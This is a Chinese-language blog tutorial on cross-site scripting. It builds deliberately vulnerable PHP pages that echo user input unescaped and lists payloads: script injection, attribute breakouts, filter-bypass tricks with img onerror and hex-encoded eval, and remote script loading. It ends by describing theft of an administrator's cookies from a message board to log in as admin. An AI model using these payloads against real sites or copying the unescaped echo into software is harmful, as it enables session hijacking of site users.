---
title: XSS的原理分析与解剖
date: 2016-05-30 11:27:07
url: p/principle-analysis-and-anatomy-of-xss
tags: ['Web Security', 'XSS']
description: "XSS原理分析第一章"
aliases: ['/2016/05/30/principle-analysis-and-anatomy-of-xss/']
---

## 0×01 前言:

《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。

我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：

1. 耗时间
2. 有一定几率不成功
3. 没有相应的软件来完成自动化攻击
4. 前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底
5. 是一种被动的攻击手法
6. 对website有http-only、crossdomian.xml没有用

但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。”

## 0x02 原理：

首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:

```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>XSS原理重现</title>
    </head>
    <body>
        <form action="" method="get">
            <input type="text" name="xss_input">
            <input type="submit">
        </form>
        <hr>
        <?php
        $xss = $_GET['xss_input'];
        echo '你输入的字符为<br>'.$xss;
        ?>
    </body>
</html>
```

然后，你会在页面看到这样的页面

![](/images/principle-analysis-and-anatomy-of-xss/1.png)

我们试着输入abcd123，得到的结果为

![](/images/principle-analysis-and-anatomy-of-xss/2.png)

我们在看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/3.png)

我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入`<script>alert('xss')</script>`会出现什么呢？如果按照上面的例子来说，它应该存在第12行的`<br>`与`</boby>`之间，变成`<br><script>alert('xss')</script></boby>`，那应该会弹出对话框。

既然假设提出来，那我们来实现下这个假设成不成立吧。

我们输入`<script>alert('xss')</script>`，得到的页面为

![](/images/principle-analysis-and-anatomy-of-xss/4.png)

成功弹窗，这个时候基本上就可以确定存在xss漏洞。

我们在看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/5.png)

看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用

## 0×03 xss利用输出的环境来构造代码:

上节说了xss的原理，但是我们的输出点不一在`<br>`和`</boby>`里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入

`<script>alert('xss')</script>`就会弹窗。

先贴出代码:
```html
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>XSS利用输出的环境来构造代码</title>
    </head>
    <body>
        <center>
            <h6>把我们输入的字符串 输出到input里的value属性里</h6>
            <form action="" method="get">
                <h6>请输入你想显现的字符串</h6>
                <input type="text" name="xss_input_value" value="输入"><br>
                <input type="submit">
            </form>
            <hr>
            <?php
            $xss = $_GET['xss_input_value'];
            if(isset($xss)){
                echo '<input type="text" value="'.$xss.'">';
            }else{
                echo '<input type="type" value="输出">';
            }
            ?>
        </center>
    </body>
</html>
```
下面是代码的页面

![](/images/principle-analysis-and-anatomy-of-xss/6.png)

这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入`<script>alert('xss')</script>`来测试)

![](/images/principle-analysis-and-anatomy-of-xss/7.png)

![](/images/principle-analysis-and-anatomy-of-xss/8.png)

明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/9.png)

我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在`<script>alert('xss')</script>`前面加个`">`来闭合input标签。所以应该得到的结果为

![](/images/principle-analysis-and-anatomy-of-xss/10.png)

成功弹窗了，我们在看看这时的页面

![](/images/principle-analysis-and-anatomy-of-xss/11.png)

看到后面有第二个input输入框后面跟有">字符串，为什么会这样呢，我们来看看源代码

![](/images/principle-analysis-and-anatomy-of-xss/12.png)

这时可以看到我们构造的代码里面有两个`">`，第一个">是为了闭合input标签，所以第二个`">`就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？

这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。

还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成`" onclick="alert('xss')`

这时，我们在来试试，页面会发生什么样的变化吧。

![](/images/principle-analysis-and-anatomy-of-xss/13.png)

没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行`alert('xss')`代码。我们来试试看

![](/images/principle-analysis-and-anatomy-of-xss/14.png)

当我点击后，就出现了弹窗，这时我们来看看源代码把

![](/images/principle-analysis-and-anatomy-of-xss/15.png)

第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成

* onmousemove 当鼠标移动就触发

* onload 当页面加载完成后触发

还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。

别以为就这样结束了，还有一类环境不能用上述的方法，

那就是如果在`<textarea>`标签里呢？！或者其他优先级比script高的呢？

就下面这样

![](/images/principle-analysis-and-anatomy-of-xss/16.png)

这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入`</textarea><script>alert('xss')</script>`就可以实现弹窗了。

## 0×04 过滤的解决办法:

假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写

```html
<img scr=1 onerror=alert('xss')> 当找不到图片名为1的文件时，执行alert('xss')
<a href=javascrip:alert('xss')>s</a> 点击s时运行alert('xss')
<iframe src=javascript:alert('xss');height=0 width=0 /><iframe> 利用iframe的scr来弹窗
<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img> 过滤了alert来执行弹窗
```

等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…)

## 0×05 xss的利用:

说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。

这时我们要插入js代码了，怎么插呢？

你可以这样

```html
<script scr="js_url"></script>
```

也可以这样
```html
<img src=x onerror=appendChild(createElement('script')).src='js_url' />
```

各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？

Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。

比如我们在网站的留言区输入`<script scr="js_url"></script>`当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。

至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。
